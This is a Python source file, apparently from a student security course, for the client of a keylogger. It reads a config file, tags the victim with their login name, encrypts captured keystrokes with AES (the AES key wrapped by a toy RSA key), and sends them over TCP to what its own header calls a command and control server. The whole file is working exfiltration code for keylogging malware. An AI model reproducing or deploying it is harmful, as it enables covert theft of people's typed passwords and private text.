'''
client.py
Kezia Sharnoff

Take a message of keys inputted and create a new TCP connection to the command 
and control server. Send the keys and close the connection. 

Basics of the TCP connection from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherClient.py
'''	

import socket, os, random, io, time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

DEFAULT_PORT = 48939
# DEFAULT_SERVER = "192.168.64.2"
DEFAULT_SERVER = "localhost"
DEFAULT_USERNAME = ""

CONFIG_FILE = "keylogger_config"

# Server public key pair, (n,e)
SERVER_n = 19519
SERVER_e = 11

def getConfigSettings():
	'''
	Get the server name and port from the config file, or return the default 
	server and port
	'''

	if not os.path.exists(CONFIG_FILE):
		with open(CONFIG_FILE, "w") as file:

			# username of client with keylogger is the form "kermit4987"
			# This is the only time we write to the file, so we can hope
			# that future reads will get the same username
			username = os.getlogin() + str(random.randint(1, 5000))

			file.write("# This is the client keylogger config file\n")
			file.write("# This config file can be edited while the keylogger is running\n")
			file.write("# it does not need to be restarted!\n")
			file.write("port " + str(DEFAULT_PORT) + "\n")
			file.write("server " + DEFAULT_SERVER + "\n")
			file.write("username " + username + "\n")

		return DEFAULT_SERVER, DEFAULT_PORT, username

	server = DEFAULT_SERVER
	port = DEFAULT_PORT
	username = DEFAULT_USERNAME

	# The config file has the form:
	# port 97843
	# server 192.168.64.2
	# username kermit4987
	# This is to make the config file expandable in the future
	try:
		with open(CONFIG_FILE, "r") as f:
			for line in f:
				line = line.strip()

				if len(line) < 1 or line[0] == "#":
					continue

				content = line.split(" ")

				if len(content) >= 2:
					match content[0].lower():
						case "port":
							port = int(content[1])
						case "server":
							server = content[1]
						case "username":
							username = content[1]
	except:
		pass

	return server, port, username


def createKey():
	return get_random_bytes(16)


def encryptKey(key):
	'''
	Input the aes_key and encrypt it using the server's public key

	Copied from the RSA lab
	'''

	encrypted = []

	for c in key:
		calc = c**SERVER_e % SERVER_n
		encrypted.append(calc)

	return encrypted


def encodeKey(keyList):
	'''
	Input the encrypted AES key which is a list of ints, turn it into
	a string with spaces, return it encoded (by utf-8) into binary

	This problem of encoding the encrypted AES key is tricky because the numbers
	are too big for a single byte, but they must be in a byte form for sending 
	over the TCP connection.
	'''

	strList = []
	for num in keyList:
		strList.append(str(num))


	# combines the list into one string with spaces between
	output = " ".join(strList)

	encoded = output.encode("utf-8")

	return encoded


# Taken from:
# https://www.pycryptodome.org/src/examples#encrypt-data-with-aes
# the "Encrypt and authenticate data in one step" step
def encryptMessage(msg, key):
	'''
	Encrypt the inputted message using the aes_key, return
	the encrypted bytes

	This can error (the assert), so this should be only called using a try,
	except

	Taken from:
	https://www.pycryptodome.org/src/examples#encrypt-data-with-aes
	the "Encrypt and authenticate data in one step" section
	'''

	encoded_msg = msg.encode("utf-8")

	cipher = AES.new(key, AES.MODE_OCB)
	ciphertext, tag = cipher.encrypt_and_digest(encoded_msg)
	assert len(cipher.nonce) == 15

	encrypted = io.BytesIO()

	encrypted.write(tag)
	encrypted.write(cipher.nonce)
	encrypted.write(ciphertext)

	return encrypted.getvalue()


def sendMessage(msg):
	'''
	Create TCP connection to the server, then do the following:
	1. create key, encrypt it, encode it, send it
	2. encrypt inputted message of keys, send it
	3. encrypt username of client, send it
	'''
	clientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	server, port, username = getConfigSettings()

	try: 
		clientSock.connect((server, port))
	except:
		print("FAILED TO CONNECT TO SERVER")
		return

	try:
		aes_key = createKey()
		encryptedKey = encryptKey(aes_key)
		encodedKey = encodeKey(encryptedKey)
		clientSock.sendall(encodedKey)
		time.sleep(0.5)

		encryptedMsg = encryptMessage(msg, aes_key)
		# do not need to encode because the encryption is bytes
		clientSock.sendall(encryptedMsg)
		time.sleep(0.5)

		if len(username) > 0:
			encryptedUser = encryptMessage(username, aes_key)
			clientSock.sendall(encryptedUser)
	except:
		pass

	clientSock.close()
